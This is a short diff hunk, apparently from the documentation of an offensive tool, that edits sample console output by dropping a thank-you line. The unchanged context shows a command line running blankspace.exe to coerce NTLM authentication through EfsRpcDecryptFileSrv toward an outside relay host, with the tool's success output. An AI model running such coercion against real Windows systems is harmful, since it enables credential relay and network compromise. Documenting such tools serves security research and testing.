@@ -102,8 +102,7 @@ C:\ProgramData>blankspace.exe -r yeet.okhuman.ninja -f \\10.0.0.3\r7\r7 --relay
 [+] Sending EfsRpcDecryptFileSrv for \\10.0.0.3\r7\r7
 [-] EfsRpcDecryptFileSrv failed with status code: 53
 [+] Network path not found error received!
-[!] Success! Thanks, James!
-
+[!] Success!
 C:\ProgramData>
 ```
 
